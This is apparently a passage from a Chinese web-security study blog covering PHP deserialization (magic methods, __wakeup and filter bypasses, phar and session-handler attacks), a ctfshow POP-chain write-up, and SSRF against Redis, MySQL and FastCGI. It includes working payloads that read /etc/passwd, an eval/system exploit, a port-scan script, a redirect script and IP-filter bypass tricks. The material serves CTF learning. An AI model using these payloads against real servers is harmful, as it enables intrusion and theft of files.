&quot;panda&quot;;  public $color = &quot;red&quot;;  public $move = &quot;step&quot;;  function eat()&#123;    echo &quot;i can eat&quot;;  &#125;  function sleep()&#123;    echo &quot;i can sleep&quot;;  &#125;  function __sleep()&#123;    return [&#x27;name&#x27;,&#x27;color&#x27;];  &#125;&#125;$a = new Animal();echo serialize ($a);\n\n打印结果为\nO:6:&quot;Animal&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;panda&quot;;s:5:&quot;color&quot;;s:3:&quot;red&quot;;&#125;//序列化后只有name和color\n\n同构__sleep方法清理后,move属性并没有进入序列化后的结果和__sleep方法对应的是wakeup方法,表示反序列化时,对所反序列化的属性进行处理wakeup函数可以不需要返回值,时对对象的属性进行一些初始化操作\n🌰\n&lt;?phpclass Animal&#123;  public $name = &quot;panda&quot;;  public $color = &quot;red&quot;;  public $move = &quot;step&quot;;  function eat()&#123;    echo &quot;i can eat&quot;;  &#125;  function sleep()&#123;    echo &quot;i can sleep&quot;;  &#125;  function __sleep()&#123;    return [&#x27;name&#x27;,&#x27;color&#x27;];  &#125;  function __wakeup()&#123;    $this -&gt; name = &quot;tiger&quot;;  &#125;&#125;// $a = new Animal();// echo serialize ($a);$b = &#x27;O:6:&quot;Animal&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;panda&quot;;s:5:&quot;color&quot;;s:3:&quot;red&quot;;&#125;&#x27;;$a = unserialize($b);echo $a -&gt; name;\n\n可以看到,我们这里反序列化的属性值,不管是不是panda,最终反序列化后,都变成了tiger,所以wakeup方法会在反序列化前被调用,用来提前处理属性的值\n\nconstruct和destruct方法和上面方法类似,这里成为构造函数和析构函数\n表示对象在实例化时执行的函数和对象要销毁前执行的函数\n&lt;?phpclass Animal&#123;  public $name = &quot;panda&quot;;  public $color = &quot;red&quot;;  public $move = &quot;step&quot;;  function eat()&#123;    echo &quot;i can eat&quot;;  &#125;  function sleep()&#123;    echo &quot;i can sleep&quot;;  &#125;  function __sleep()&#123;    return [&#x27;name&#x27;,&#x27;color&#x27;];  &#125;  function __wakeup()&#123;    $this -&gt; name = &quot;tiger&quot;;  &#125;  function __construct()&#123;    echo &quot;对象被new时执行&lt;br&gt;&quot;;  &#125;  function __destruct()&#123;    echo &quot;对象被销毁时执行&lt;br&gt;&quot;;  &#125;&#125;$a = new Animal();\n\n也就是说,在PHP代码中,实例化一个对象的时候,会自动调用类的__construct方法,当前php脚本即将运行结束,就会调用已经实例化的类的__destruct方法 所以上面的栗子会先调用前者,再调用后者.\n但是,如果单纯的进行反序列化,不实例化对象时,只会调用__destruct方法\n这里会是一个明显的调用入口,如果我们反序列化一个拥有__destruct方法的对象时,会自动调用这个析构方法,而如果这个析构方法中,有我们可以控制的值,那么就可以实现我们恶意代码内容\n在php反序列化利用，析构方法是很好的入手点，但是我们可能不一定能够找到非常合适的析构方法供我们使用\ncall和callStatic方法在对象中调用一个不可访问的方法时，__call()会被调用\n在静态上下文中调用一个不可访问的方法时, __callStatic()会被调用\n&lt;?phpclass ctfshow&#123;    public function __call($name,$args)&#123;        echo &quot;i called method&quot;.$name. &quot;&lt;br&gt;&quot;;        echo &quot;args is &lt;br&gt;&quot;;        print_r($args);    &#125;&#125;$cs = new ctfshow();$cs-&gt;go(1, &quot;CT&quot;,&quot;m4a1&quot;);?&gt;\n\nget、set和isset、unset\n在给不可访问属性赋值时,__set()会被调用.\n读取不可访问属性的值时,__get()会被调用.\n当对不可访问属性调用isset()或empty()时,__isset()会被调用.\n当对不可访问属性调用unset()时,__unset()会被调用.\n\ntostring方法__toString()方法用于一个类被当成字符串时应怎样回应.例如echo $obj;应该显示些什么.此方法必须返回一个字符串,否则将发出一条E_RECOVERABLE_ERROR级别的致命错误.\n&lt;?phpclass secret&#123;    public $secret = &quot;you never know my secret&quot;;    public function show($name)&#123;        echo &quot;hey $name!&quot;.$this-&gt;secret ;    &#125;    public function __toString()&#123;        return $this -&gt; secret;    &#125;&#125;$c = new secret();echo $c;//相当于执行//echo $c-&gt;__toString();\n\n执行结果\nyou never know my secret\n\n这里直接打印对象实例,会自动调用对象的__toString方法,这里方法名字大小写不敏感\ninvoke方法当尝试以调用函数的方式调用一个对象时__invoke()方法会被自动调用\n&lt;?phpclass secret&#123;  public $secret = &quot;you never know my secret&quot;;  public function show($name)&#123;    echo &quot;hey $name!&quot;.$this -&gt; secret;  &#125;  public function __invoke($name)&#123;    return $this -&gt;show($name);  &#125;&#125;$c = new secret();echo $c (&#x27;charmersix&#x27;);\n\n执行结果\nhey charmersix!you never know my secret\n\n前面魔术方法在我们构造反序列化利用链时非常有用，必须掌握，后面方法，相对冷僻，需要熟悉\nset_state方法自php5.1.0起,当调用var_export()导出类时,此静态方法会被调用\n本方法唯一的参数是一个数组,其中包含array(&#39;property&#39;=&gt;value,...)格式排列的类属性\n注意,这里是静态方法,和__tostring方法类似,不过这里主要输出类的属性结构\nstatic object __set_state(array $properties)\n\ndebugInfo方法array __debugInfo(void)\n\n当调用var_dump时,调用这个方法,显示类的属性具体结构和值\n0x5 反序列化中的绕过绕过__wakeup方法这个主要是基于CVE-2016-712\n具体利用时通过手动修改类的属性个数,让前后不一致时,__wakeup函数就会绕过执行,触发可能存在的漏洞\n利用条件\n\nphp5-5.6.25\nphp7-7.0.10\n\n在这个版本范围之内,可以用这个绕过方法,具体我们看一个栗子\n将本地phpstudy中的php调整到5.6\n源码\n&lt;?phperror_reporting(0);highlight_file(__FILE__);class backdoor&#123;    public $name;    public function __wakeup()    &#123;        $this-&gt;name=&#x27;phpinfo();&#x27;;        // TODO: Implement __wakeup() method.    &#125;    public function __destruct()&#123;        eval($this-&gt;name);    &#125;&#125;$data = $_POST[&#x27;data&#x27;];unserialize($data);\n\nexp\n&lt;?phperror_reporting(0);highlight_file(__FILE__);class backdoor&#123;    public $name=&quot;system(&#x27;calc&#x27;);&quot;;    public function __wakeup()    &#123;        $this-&gt;name=&#x27;phpinfo();&#x27;;        // TODO: Implement __wakeup() method.    &#125;    public function __destruct()&#123;        eval($this-&gt;name);    &#125;&#125;//$data = $_POST[&#x27;data&#x27;];//unserialize($data);$b = new backdoor();echo serialize($b);\n\n这里我们生成的payload是\nO:8:&quot;backdoor&quot;:1:&#123;s:4:&quot;name&quot;;s:15:&quot;system(&#x27;calc&#x27;);&quot;;&#125;//这里的1表示只有一个属性,我们手动改成2,代表有两个,但是实际只有一个,就会报错,绕过__wakeup\n\n+号绕过正则匹配如果在输入参数进行了过滤，不允许输入类似O:8这种开头,主要是为了限制不能反序列化对象,这时候,可以通过在数字前面增加一个+号过滤,类似O:+8\n引用绕过php中也可以使用引用符号&amp;,这里就是传址,如果不加,就是传值\n传值的最大特点就是引用可以不同,但是指向是相同的\n例如\n&lt;?phperror_reporting(0);highlight_file(__FILE__);function add(&amp;$str)&#123;    $str = &quot;love&quot;.$str;    return $str;&#125;$a = &#x27;you&#x27;;add($a);echo $a;\n\nAscii码绕过如果在反序列化后的字符串s变更为大写的S后,就会支持将里面的字符按照\\xx格式Ascii读取,绕过对关键字的检测\n例如：\nO:8:&quot;backdoor&quot;:1:&#123;s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;&#125;\n\n修改后的payload为\nO:8:&quot;backdoor&quot;:1:&#123;S:4:&quot;n\\97me&quot;;s:10:&quot;phpinfo();&quot;;&#125;\n\nException绕过Exception是异常，看下面栗子\n&lt;?phperror_reporting(0);highlight_file(__FILE__);class backdoor&#123;    public function __destruct()&#123;        echo file_get_contents(&quot;/f1ag&quot;);    &#125;&#125;$data = $_POST[&#x27;data&#x27;];if(unserialize($data))&#123;    throw new Exception(&quot;not allow unserialize&quot;);&#125;\n\n通过破坏里面的属性格式，但是类名正确的情况，还是会执行类的析构方法\npayload如下\nO:8:&quot;backdoor&quot;:1:&#123;1&#125;\n\n字符逃逸绕过php在序列化数据的时候，如果序列化的是字符串，就会保留该字符串的长度，然后将长度写入序列化后的数据，反序列化时就会按照长度进行读取，并且PHP底层实现上是以;作为分割&#125;作为结尾\n类中不存在的属性也会进行反序列化,这里就会发生逃逸问题,而导致对象注入\n🌰\n&lt;?phpclass backdoor&#123;    public $m;    public $c;&#125;$b = new backdoor();$b-&gt;m=&#x27;system&#x27;;$b-&gt;c=&#x27;ls&#x27;;echo serialize($b);\n\n显示结果:\nO:8:&quot;backdoor&quot;:2:&#123;s:1:&quot;m&quot;;s:6:&quot;system;s:1:&quot;c&quot;;s:2:&quot;ls&quot;;&#125;\n\n这里我们如果用双引号,闭合,会发现不能闭合\n因为这里长度为8,它反序列化的时候,会从后面第一个双引号开始,读取6个字符作为m的值,即使有双引号,也不能闭合\n这里序列化后进行了一次过滤,将system过滤为了ctfshow,最后序列化的结果就成了\nO:8:&quot;backdoor&quot;:2:&#123;s:1:&quot;m&quot;;s:6:&quot;ctfshow&quot;;&quot;;s:1:&quot;c&quot;;s:2:&quot;ls&quot;;&#125;\n\n还是从6后面读取6个字符,会读取到ctsho,由于没有闭合,就反序列化失败了,所以这时候,我们就逃出了1个字符w,如果我们写两个system让他过滤,就会得到\nO:8:&quot;backdoor&quot;:2:&#123;s:1:&quot;m&quot;;s:12:&quot;ctfshowctfshow&quot;;&quot;;s:1:&quot;c&quot;;s:2:&quot;ls&quot;;&#125;\n\n观察规律,可以知道:system变成ctfshow的时候,字母数量由12变成了14,但是序列化的时候没有变,所以写入的字符串长度依旧时12\n那么按照以前的12个长度进行读取,会把2个字符逃逸出来\n如果这两个字符刚好是双引号,分号,就完整的闭合了属性\n这里我们用3个system就可以逃逸出3个字符，我们用&quot;;&#125;来结束反序列化读取\n$b-&gt;m=&#39;systemsystemsystem&quot;;&#125;&#39;;替换后得到O:8:&quot;backdoor&quot;:2:&#123;s:1:&quot;m&quot;;s:21:&quot;ctfshowctfshowctfshow&quot;;&#125;&quot;;s:1:&quot;c&quot;;s:2:&quot;ls&quot;;&#125;\n可以看到扔掉了c这个属性的值,继续增加system的数量就可以注入我们想要的属性\n第三节 phar的反序列化0x6 什么是pharphar是一类文件的后缀名称，也是php协议的一种\nphar可以将多个php文件合并到一个独立的压缩包，相对独立，不用解压到硬盘即可运行php脚本，支持web服务器和命令行运行\n\n0x7 基于phar的反序列化phar怎么用正常来说文件包含是这样的\ninclude &quot;flag.php&quot;;\n\n对于以上典型的文件包含,php底层是这么处理的\ninclude &quot;file://flag.php&quot;;\n\n所以要使用phar包里的文件相应的使用phar协议进行包含\ninclude &quot;phar://com.ctfshow.fileUtil.phar/file.php&quot;;  \n\n可以发现很像Java的依赖包\nimport java.util.HashMap;//引入util.jar,使用里面的hashmap类,先声明出来,后面要用\n\n所以phar就可以认为是类似于Java的一种jar包, 将相对独立的多个php文件打包在一起, 组成一个独立的模块供其他应用调用, 或者干脆自己打包为一个独立的应用, 类似于我们bp.jar\nphar是怎么生成的那么如何打包一个phar文件呢,首先改一下配置文件\n\n[Phar]; http://php.net/phar.readonlyphar.readonly = Off\n\n\n然后我们自己着手写一下\n//index.php&lt;?php$phar = new Phar(&#x27;flag.phar&#x27;);//phar已经是个对象，然后调用方法$phar-&gt;buildFromDirectory(dirname(__FILE__).&#x27;/project&#x27;);//public PharData::buildFromDirectory(string $directory)//dirname() 函数返回路径中的目录名称部分。$phar-&gt;setStub($phar-&gt; createDefalutStub(&#x27;index.php&#x27;));//final public static Phar::createDefaultStub(?string $index = null, ?string $webIndex = null)\n\n然后我们需要新建一个project目录, 里边放上我们要打包的文件/project/index.php\n//index.php&lt;?php$flag=&quot;flag&#123;i am in phar&#125;&quot;;echo $flag;\n\n然后我们执行一下第一个index.php, 会发现在本地已经生成了一个flag.phar\n再写一个include.php来读取我们的phar文件\n//include.php&lt;?phpinclude &quot;./flag.phar&quot;;\n\n最终我们执行一下include.php, 就可以读取到flag内容\n\n我们在包含的时候也可以不加phar后缀, 因为php文件没有后缀也是能读取的, like this\nphar是怎么反序列化的\n比方说这里有一个题目\n文件上传， 但是不让上传php、ini、htaccess（黑名单）就可以尝试上传phar文件, phar文件里就有可能用到了file_exists(), 就可以利用反序列化\n\nphar的底层原理是c代码, 这里不再细看\n当使用phar::getMetadata方法时, 会进行反序列化, 我们本地测试一下\n//index.php&lt;?phpclass hack&#123;    public function __destruct()    &#123;        echo &quot;hack class destruct&quot;;    &#125;&#125;$h = new hack();//执行析构$phar = new Phar(&#x27;flag.phar&#x27;);$phar-&gt; buildFromDirectory(dirname(__FILE__).&#x27;/project&#x27;);$phar-&gt; setMetadata($h);$phar-&gt; setStub($phar-&gt; createDefaultStub(&#x27;flag.php&#x27;,&#x27;index.php&#x27;));\n\n我们打开phar文件可以发现, 出现了序列化的strings\n执行之后, 发现本地生成了flag.phar, 然后尝试getMetadata, 看看能否反序列化hack类\n//test.php&lt;?phpclass hack&#123;    public function __destruct()    &#123;        echo &quot;hack class destruct&quot;;    &#125;&#125;$phar = new Phar(&#x27;flag.phar&#x27;);$phar-&gt; getMetadata();\n\n\n可以发现时成功反序列化hack类\n那么有没有可以自动反序列化的方法呢, 当然有, 通过尝试, 我们发现include协议和phar协议都可以反序列化\n//include.php&lt;?phpclass hack&#123;    public function __destruct()    &#123;        echo &quot;hack class destruct&quot;;    &#125;&#125;file_exists(&#x27;phar://flag.phar&#x27;);//include &#x27;flag.phar&#x27;;//这里地址可以精确到/flag.phar/flag.php, 也可以只写到/flag.phar, 因为在index.php里用到了createDefaultStub缺省方法\n\n\n\n那么为什么这个协议就可以反序列化呢, 我们可以看一下php的源码, 具体可以看这里的1874行\n能使用phar伪协议的地方,就能自动反序列化metaData里面的数据\n具体哪些函数可以用phar协议这里做一个汇总, 可以说是比较全面的\n\n\n\nfileatime\nfilectime\nfile_exists\nfile_get_contents\nfile_put_contents\n\n\n\nfile\nfilegroup\nfopen\nfileinode\nfilemtime\n\n\nfileowner\nfileperms\nfstat\nfseek\nis_dir\n\n\nis_link\nis_readable\nis_writeable\nis_writable\ninclude\n\n\ninclude_once\nopendir\nparse_ini_file\nrmdir\nrequire\n\n\nrequire_once\nreadfile\nstat\nunlink\nmkdir\n\n\ncopy\nscandir\nfilesize\nhighlight_file\nnew DirectoryIterator\n\n\n两种情况下phar能够利用\n\n能够控制上传或者写入phar文件的情况下. 没有恶意类, 但是可以包含. 就会执行phar里面打包的php文件\n有恶意类, 没有包含, 但是有文件操作函数, 可以控制phar协议头. 可以自动反序列化里面的metaData数据, 配合析构方法, 可能造成漏洞\n\n总结\nphar中, 使用setmetaData函数可以保存任意可反序列化的变量以及类实例\n文件操作函数中, 只要能控制协议头, 均可自动反序列化metaData的数据\n文件包含的情况下, 可以直接执行里面的php文件中的php代码\n\n第四节 session的反序列化0x8 PHP中的session机制在php.ini有以下几个默认选项\nsession.upload_progress.enabled = On//表示upload_progress功能开启, 也意味着当浏览器向服务器上传一个文件时, php将会把此次文件上传的详细信息(如上传时间/上传进度等)存储在session中;session.upload_progress.cleanup = On//表示当文件上传结束后, PHP将会立即清空对应的session文件中的内容, 这个选项非常重要;如果开启表示可能需要竞争, 如果不开启就不需要竞争session.upload_progress.prefix = &quot;upload_progress_&quot;//prefix+name将表示为session中的键名session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;//当name出现在表单中, PHP将会报告上传进度, 最大好处是 它的值可控session.upload_progress.freq =  &quot;1%&quot;session.upload_progress.min_freq = &quot;1&quot;\n\n这里我们只需要了解前四个配置选项即可\n0x9 session处理handler引起的安全问题这里我们写两段PHP代码来本地实验一下\n//index.php&lt;?phpsession_start();//ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);class User&#123;    public $name;&#125;$u = new User();$u-&gt;name=&#x27;charmersix&#x27;;$_SESSION[&#x27;user&#x27;]=$u;?&gt;\n\n首先我们来看一下本地session.serialize_handler的不同有什么影响, 这里我们再写一个phpinfo\n//phpinfo.php&lt;?phpphpinfo();?&gt;\n\n\n可以看到原始的是php, 这里我们获取一下session试试, 我们可以在本地看到session内容\n然后我们换一个handler\n来到配置文件修改一下\n可以发现明显的不同\nini: session.serialize_handler = phpsession: user|O:4:&quot;User&quot;:1:&#123;s:4:&quot;name&quot;;s:10:&quot;Charmersix&quot;;&#125;ini:  session.serialize_handler = php_serializesession: a:1:&#123;s:4:&quot;user&quot;;O:4:&quot;User&quot;:1:&#123;s:4:&quot;name&quot;;s:10:&quot;Charmersix&quot;;&#125;&#125;\n\n如果我们存储的是php_serialize形式, 然后再用php这种形式去读取, 就会出现一个反序列化的情况.\n比如这样\n|O:4:&quot;User&quot;:1:&#123;s:4:&quot;name&quot;;s:10:&quot;Charmersix&quot;;&#125;\n\n这样就可以把|后面的反序列化\n这里我们做一个题目试试, 由于这个题目曾经出现过ctfshow平台的年初挑战, 所以是可以免费出现的, 别的一些ctfshow会员题目由于担心侵权, 所以题目源码就尽量不会出现在我的文章里\n//index.php&lt;?phpinclude(&quot;class.php&quot;);error_reporting(0);highlight_file(__FILE__);ini_set(&quot;session.serialize_handler&quot;, &quot;php&quot;);session_start();if (isset($_GET[&#x27;phpinfo&#x27;]))&#123;    phpinfo();&#125;if (isset($_GET[&#x27;source&#x27;]))&#123;    highlight_file(&quot;class.php&quot;);&#125;$happy=new Happy();$happy();?&gt;\n\n//class.php&lt;?php    class Happy &#123;        public $happy;        function __construct()&#123;                $this-&gt;happy=&quot;Happy_New_Year!!!&quot;;        &#125;        function __destruct()&#123;                $this-&gt;happy-&gt;happy;        &#125;        public function __call($funName, $arguments)&#123;                die($this-&gt;happy-&gt;$funName);        &#125;        public function __set($key,$value)        &#123;            $this-&gt;happy-&gt;$key = $value;        &#125;        public function __invoke()        &#123;            echo $this-&gt;happy;        &#125;    &#125;    class _New_&#123;        public $daniu;        public $robot;        public $notrobot;        private $_New_;        function __construct()&#123;                $this-&gt;daniu=&quot;I&#x27;m daniu.&quot;;                $this-&gt;robot=&quot;I&#x27;m robot.&quot;;                $this-&gt;notrobot=&quot;I&#x27;m not a robot.&quot;;        &#125;        public function __call($funName, $arguments)&#123;                echo $this-&gt;daniu.$funName.&quot;not exists!!!&quot;;        &#125;        public function __invoke()        &#123;            echo $this-&gt;daniu;            $this-&gt;daniu=$this-&gt;robot;            echo $this-&gt;daniu;        &#125;        public function __toString()        &#123;            $robot=$this-&gt;robot;            $this-&gt;daniu-&gt;$robot=$this-&gt;notrobot;            return (string)$this-&gt;daniu;        &#125;        public function __get($key)&#123;               echo $this-&gt;daniu.$key.&quot;not exists!!!&quot;;        &#125; &#125;    class Year&#123;        public $zodiac;         public function __invoke()        &#123;            echo &quot;happy &quot;.$this-&gt;zodiac.&quot; year!&quot;;        &#125;         function __construct()&#123;                $this-&gt;zodiac=&quot;Hu&quot;;        &#125;        public function __toString()        &#123;                $this-&gt;show();        &#125;        public function __set($key,$value)#3        &#123;            $this-&gt;$key = $value;        &#125;        public function show()&#123;            die(file_get_contents($this-&gt;zodiac));        &#125;        public function __wakeup()        &#123;            $this-&gt;zodiac = &#x27;hu&#x27;;        &#125;    &#125;?&gt;\n\n这里由于本人比较菜就参考一下官方的wp\n思路:\n1.利用happy类的析构方法2.读取happy属性的happy属性, 会调用happy属性的__get方法    所以happy属性必须为new的实例3.__get方法会触发某个对象的__toString方法4.__toString方法触发Year类的show方法\n\n这里可以发现pop链:\nHappy:__destruct()=&gt;_New_:__get()=&gt;_New_:__toString()=&gt;Year:__toString()=&gt;Year:Show()\n\n然后我们通过post传一下payload, 构造上传表单\n&lt;form action=&quot;url&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot;&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;    &lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;\n\n构造exp.php\n&lt;?php    class Happy &#123;        public $happy;    &#125;    class _New_&#123;        public $daniu;        public $robot;        public $notrobot; &#125;    class Year&#123;        public $zodiac;    &#125;$a=new Happy();$a-&gt;happy=new _New_();$a-&gt;happy-&gt;daniu=new _New_();$a-&gt;happy-&gt;daniu-&gt;daniu=new Year();$a-&gt;happy-&gt;daniu-&gt;robot=&quot;zodiac&quot;;$a-&gt;happy-&gt;daniu-&gt;notrobot=&quot;/etc/passwd&quot;;echo serialize($a);?&gt;\n\n&lt;?phpinclude &quot;class.php&quot;;//$data = $_POST[&#x27;data&#x27;];//unserialize($data);$h = new Happy();$h-&gt;happy = new _New_();$h-&gt;happy-&gt;daniu = new _New_();$h-&gt;happy-&gt;daniu-&gt;daniu = new Year();$h-&gt;happy-&gt;daniu-&gt;robot = &quot;zodiac&quot;;$h-&gt;happy-&gt;daniu-&gt;notrobot = &#x27;/etc/passwd&#x27;echo urlencode(serialize($h));\n\n生成payload\nO:5:&quot;Happy&quot;:1:&#123;s:5:&quot;happy&quot;;O:5:&quot;_New_&quot;:3:&#123;s:5:&quot;daniu&quot;;O:5:&quot;_New_&quot;:3:&#123;s:5:&quot;daniu&quot;;O:4:&quot;Year&quot;:1:&#123;s:6:&quot;zodiac&quot;;N;&#125;s:5:&quot;robot&quot;;s:6:&quot;zodiac&quot;;s:8:&quot;notrobot&quot;;s:11:&quot;/etc/passwd&quot;;&#125;s:5:&quot;robot&quot;;N;s:8:&quot;notrobot&quot;;N;&#125;&#125;\n\n这里我们需要在payload前加上|以及用\\来转义&quot;\n最终payload\n|O:5:\\&quot;Happy\\&quot;:1:&#123;s:5:\\&quot;happy\\&quot;;O:5:\\&quot;_New_\\&quot;:3:&#123;s:5:\\&quot;daniu\\&quot;;O:5:\\&quot;_New_\\&quot;:3:&#123;s:5:\\&quot;daniu\\&quot;;O:4:\\&quot;Year\\&quot;:1:&#123;s:6:\\&quot;zodiac\\&quot;;N;&#125;s:5:\\&quot;robot\\&quot;;s:6:\\&quot;zodiac\\&quot;;s:8:\\&quot;notrobot\\&quot;;s:11:\\&quot;/etc/passwd\\&quot;;&#125;s:5:\\&quot;robot\\&quot;;N;s:8:\\&quot;notrobot\\&quot;;N;&#125;&#125;\n\n发包, 们会发现他这里有一个\n所以我们需要把cookie补上, 成功\n","tags":["Web","Study","unserialize"]},{"title":"Web_7_SSRF/JWT/XXE","url":"/2022/10/30/web_7_ssrf/","content":"第一节 SSRF的漏洞利用0x1 ssrf原理解析什么是ssrf\n服务端请求伪造，攻击者向服务端发送包含恶意url链接的请求。ssrf常被用于探测攻击者无法访问的网络区域，比如内网或是防火墙访问限制的主机。\n\n控制服务器使用指定的协议(如http协议,file协议)\nssrf原理ssrf漏洞攻击的目标主机是从外网无法直接访问的内部系统\n服务端提供了从外部服务获取数据的功能，但没有对目标地址、协议等主要参数进行过滤和限制，从而导致攻击者可以自由构造参数，发起恶意请求\n正常访问逻辑如下图\n\n可能产生ssrf漏洞的函数有\nfile_get_content() 、fsockopen() 、curl_exec()\n\nurl结构url结构遵循RFC1738标准，基本结构如下  \n\n0x2 ssrf漏洞利用任意文件读取file协议读取文件,但是前提是知道文件名\n内网资源探测利用控制的host字段来扫描内网存活的主机\n监听分三钟\n\n127.0.0.1 只允许本地访问\n0.0.0.0 允许任意地址访问\n192.168.233.233 只允许特定IP访问\n\n这里可以写一个脚本帮我们探测内网网络端口\nimport requestsurl = &quot;靶机&quot;ports = [80,443,8080,80000,9000,21,3306,6379,8088]for p in ports:  data = &#123;    &quot;url&quot;:&quot;http://127.0.0.1:&#123;&#125;&quot;.format(p)  &#125;  response = requests.post(url=url,data=data)  if response.text != &quot;&quot;:    print(&quot;port: &#123;&#125; is open&quot;.format(p))  else:    print(&quot;port:&#123;&#125; is close&quot;.format(p))\n\ngopher协议扩展攻击面\nGopher是Internet上非常有名的信息查找系统, 它将Internet上的文件组织成某种索引, 很方便地将用户从Internet的一处带到另一处. 在www出现之前, Gopher是Internet上最主要的信息检索工具, Gopher站点也是最主要的站点, 使用tcp 70端口. 但在www出现后, Gopher失去了昔日的辉煌.\n\ngopher://负责转发的一个协议\n攻击redis的6379端口redis是一个常用的缓存部件.一般运行在内网，使用者大多将其绑定在127.0.0.1:6397地址,且一般为空命令\nredis一条命令执行一个行为,一条是错的,下一条会继续执行\n如果我们能控制报文的任意一行,就可以实现攻击.\n这里我们可以使用Gopherus工具生成gopher协议打一下,这里要注意一下,在使用Gopherus时要记得二次url编码\n\n\n\n\n问题来了,这里为什么要进行二次编码呢?\n\n因为他进行了两次解码,我们在发送到redis要经过一个服务器的转发,比如这里是nginx转发,在我们传输到nginx时就进行了一次url解码,再发送给redis时,又进行了一次解码,所以我们要进行两次编码.\n\n攻击MySQL的3306端口MySQL分为客户端和服务端,由客户端连接服务端有四种方式,分别是\n\nunix套接字\n内存共享\n命令管道\nTCP/IP套接字\n\n我们进行攻击依靠第四种方式,MySQL客户端连接时,有两种情况:\n\n需要密码认证,服务器先发送salt,客户端使用salt进行加密后再验证\n不需要密码认证,直接使用上边第四种方式发送数据包\n\n这里攻击MySQL要在非交互条件下进行,一定只能攻击没有密码的的MySQL服务端\n这里我们写马要用MySQL语句写\n\n攻击fastcgi的9000端口\nphp-fpm是个中间件,在需要PHP解释器来处理php文本时会用到php-fpm.\n自从PHP5.3以后将php-fpm继承到php内核种.php-fpm提供了更好的php进程管理方式,可以有效控制内存和进程,可以平滑重载php配置\n\n以我们经常执行访问的index.php?file=/etc/passwd为例:\n\n浏览器发送访问index.php的请求到web服务器,比如nginx/apache\n\nweb服务器将请求的uri(index.php),参数(file=/etc/passwd)等等发送给专门的php解释器来执行,因为nginx/apache是只能处理静态文件(通过文件读取的方式) , 对于动态的php脚本, 需要专门的php-fpm中间件来解释执行\n\nphp-fpm收到了web服务器传递过来的各种参数后, 初始化zend虚拟机, 对php文件做词法分析,语法分析,编译成opcode,并执行.最后关闭zend虚拟机.将执行结果返回给web服务器\n\nweb服务器收到返回结果后,将http相应传给浏览器\n\n\n\n包含配置文件以后，后面紧跟一句\nfastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name\n定义了一个SCRIPT_FILENAME,值是$document_root$fastcgi_script_name\n重点看SCRIPT_FILENAME,这个就是nginx传给php-fpm的\nnginx和php-fpm的数据交互,使用的是fast-cgi协议\nfastcgi协议\nfastcgi其实是一个通信协议,和http协议一样,都是进行数据交换的一个通道.http协议是浏览器和服务器中间件进行数据交换的协议,浏览器将http头和http体用某个规则组装成数据包,以tcp的方式发送到服务器中间件,服务器中间件按照规则将数据包解码,并按要求拿到用户需要的数据,再以http协议的规则打包返回给服务器.\n\n可以使用伪造的fastcgi协议数据,与php-fpm交互,通过伪造script_filename的参数,来实现执行任意的PHP脚本文件\nssrf-&gt;控制服务端脚本请求本地php-fpm端口-&gt;伪造配置参数包含php://input数据-&gt;执行php://input内提交的代码\n这里还是使用gopherus\n\n0x3 ssrf的绕过使用enclosed alphanumerics绕过数字限制① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿\n\n比如我们访问127.0.0.1,如果0被过滤了就可以使用127.⓿.⓿.1\nIP地址进制绕过IP地址可以转int也可以转不同进制来表示\n比如我们使用这个http://www.tbfl.store/net/ip.html 来转一下127.0.0.1\n\n特殊写法绕过IP地址有一些特殊的写法,在Windows下,0代表0.0.0.0,而在Linux下,0代表的是127.0.0.1\n所以,在某些情况下可以使用http://00 请求127.0.0.1\n甚至我们可以将127.0.0.1中的0忽略掉,直接访问127.1代表127.0.0.1\n\nLinux下也可以用中文句号代表点,127。0。0。1代表127.0.0.1\n\n302跳转需要一个vps，把302转换的代码部署到vps上，然后去访问，就可以跳转到内网中，比如302.php\n&lt;?php$schema = $_GET[&#x27;s&#x27;];$ip = $_GET[&#x27;i&#x27;];$port = $_GET[&#x27;p&#x27;];$query = $_GET[&#x27;q&#x27;];if(empty($port))&#123;  header(&quot;Location: $schema://$ip/$query&quot;);&#125;else&#123;  header(&quot;Location: $schema://$ip:$port/$query&quot;);&#125;\n\n如果服务器跟踪了location字段,就可以自动转向\n短网址绕过网上有很多转换短网址的工具随便百度一个就有\n比如说http://charmersix.icu/转换成http://jj6m.cn/e0fSu\n第二节 JWT的原理以及突破0x4 什么是jwtjwt基本概念json web token(jwt) 